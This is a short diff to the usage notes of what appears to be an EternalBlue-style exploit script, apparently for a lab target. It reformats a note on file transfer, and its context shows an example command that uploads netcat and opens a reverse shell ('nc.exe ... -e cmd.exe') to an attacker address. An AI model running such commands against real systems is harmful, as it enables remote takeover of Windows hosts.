@@ -11,7 +11,7 @@ usage:
    
    `python3 eternal.py -i <remote ip> -c <rce to execute>`
 
- NOTE: files transfered will appear inside remote host like c:\<output file name>
+ NOTE: files transfered will appear inside remote host -> `c:\<output file name>`
 
 example: `python3 eternal.py -i 10.10.10.40 -t nc.exe -o nc.exe -c 'c:/nc.exe 10.10.15.8 4455 -e cmd.exe'`
 
